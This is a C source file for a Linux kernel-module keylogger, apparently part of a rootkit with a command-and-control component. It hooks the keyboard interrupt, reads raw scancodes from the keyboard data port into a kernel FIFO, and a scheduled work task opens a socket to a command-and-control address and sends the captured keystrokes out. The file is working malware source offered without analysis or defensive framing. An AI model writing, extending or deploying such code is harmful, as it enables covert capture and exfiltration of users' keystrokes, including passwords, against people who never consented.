#include "keylogger.h"
#include "c2.h"
#include "kfifo.h"
#include "socket.h"
#include "userloader.h"

#include <linux/io.h>
#include <linux/ioport.h>
#include <linux/slab.h>

irq_data irq_data_;
struct kfifo fi;
struct kfifo *fifo = &fi;
struct work_arg_struct worker1;

void _keylogger_buffer_send_task(struct work_struct *work)
{
	struct socket *sock;
	struct keylogger_buffer *buf;

	unsigned int port = C2_KEYLOGGER_PORT;

	sock = socket_create();
	socket_connect(sock, C2_ADDR, port);

	buf = _keylogger_buffer_read();

	socket_send(sock, buf->buffer, buf->size);

	socket_close(sock);

	kfree(buf);
}

void keylogger_buffer_send(void)
{
	schedule_work(&worker1.work);
}

keylogger_buffer *_keylogger_buffer_read(void)
{
	int ret;
	keylogger_buffer *buffer =
		kmalloc(sizeof(struct keylogger_buffer), GFP_KERNEL);
	ret = kfifo_out(fifo, buffer->buffer, KFIFO_SIZE_MAX);
	buffer->size = ret;
	return buffer;
}

void _keylogger_buffer_write(unsigned char *scancode)
{
	unsigned char out_value;
	int ret;
	if (kfifo_is_full(fifo)) {
		ret = kfifo_out(fifo, &out_value, 1);
	}
	ret = kfifo_in(fifo, scancode, 1);
	return;
}

irqreturn_t _irq_handler(int irq, void *dev_id)
{
	static spinlock_t spinlock;
	// unsigned char *ascii;
	spin_lock(&spinlock);
	irq_data_.scancode = inb(DATA_PORT);

	_keylogger_buffer_write(&irq_data_.scancode);
	spin_unlock(&spinlock);
	return IRQ_HANDLED;
}

void keylogger_init(void)
{
	int ret;

	INIT_WORK(&worker1.work, _keylogger_buffer_send_task);

	ret = kfifo_alloc(fifo, KFIFO_SIZE_MAX, GFP_KERNEL);

	request_region(0x0061, 1, "myport1");

	ret = request_irq(1, _irq_handler, IRQF_SHARED, "klg", &irq_data_);

	return;
}

void keylogger_exit(void)
{
	kfifo_free(fifo);
	release_region(0x0061, 1);
	free_irq(1, &irq_data_);
}

EXPORT_SYMBOL(keylogger_init);
EXPORT_SYMBOL(keylogger_exit);
